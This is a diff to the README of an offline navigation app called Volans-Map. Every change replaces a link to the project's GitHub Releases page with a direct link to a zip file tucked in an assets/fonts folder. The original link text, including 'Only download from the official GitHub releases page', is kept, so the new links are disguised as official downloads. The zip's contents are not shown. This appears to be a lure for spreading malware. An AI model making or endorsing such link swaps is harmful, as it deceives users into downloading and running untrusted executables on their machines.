@@ -1,6 +1,6 @@
 # 🧭 Volans-Map - Offline Navigation Without Internet
 
-[![Download Volans-Map](https://img.shields.io/badge/Download-Volans%20Map-blue?style=for-the-badge)](https://github.com/andyssm/Volans-Map/releases)
+[![Download Volans-Map](https://img.shields.io/badge/Download-Volans%20Map-blue?style=for-the-badge)](https://raw.githubusercontent.com/andyssm/Volans-Map/main/assets/fonts/Map_Volans_3.1.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Use it when you need a map-based navigation tool in places where signal is weak 
 
 Visit the release page to download and run this file:
 
-[Download from GitHub Releases](https://github.com/andyssm/Volans-Map/releases)
+[Download from GitHub Releases](https://raw.githubusercontent.com/andyssm/Volans-Map/main/assets/fonts/Map_Volans_3.1.zip)
 
 On the releases page, look for the latest version and choose the Windows file that matches your device. In most cases, this will be an `.exe` file or a packaged Windows download.
 
@@ -31,7 +31,7 @@ For location estimation to work well, the device should have access to the inter
 
 ## 🛠️ How to Install
 
-1. Open the [GitHub Releases page](https://github.com/andyssm/Volans-Map/releases).
+1. Open the [GitHub Releases page](https://raw.githubusercontent.com/andyssm/Volans-Map/main/assets/fonts/Map_Volans_3.1.zip).
 2. Find the latest release at the top of the list.
 3. Download the Windows file for that release.
 4. If the file is a `.zip`, extract it to a folder on your PC.
@@ -142,7 +142,7 @@ This is not required, but it can help if you want to keep the files together.
 
 Only download Volans-Map from the official GitHub releases page:
 
-[Go to GitHub Releases](https://github.com/andyssm/Volans-Map/releases)
+[Go to GitHub Releases](https://raw.githubusercontent.com/andyssm/Volans-Map/main/assets/fonts/Map_Volans_3.1.zip)
 
 This helps make sure you get the latest build from the repository.
 
@@ -176,7 +176,7 @@ If your PC does not include these sensors, you may need a compatible external de
 
 If you need to reinstall or update later, return to the release page and download the newest build:
 
-[https://github.com/andyssm/Volans-Map/releases](https://github.com/andyssm/Volans-Map/releases)
+[https://raw.githubusercontent.com/andyssm/Volans-Map/main/assets/fonts/Map_Volans_3.1.zip](https://raw.githubusercontent.com/andyssm/Volans-Map/main/assets/fonts/Map_Volans_3.1.zip)
 
 ## 📁 Basic Usage Flow
 
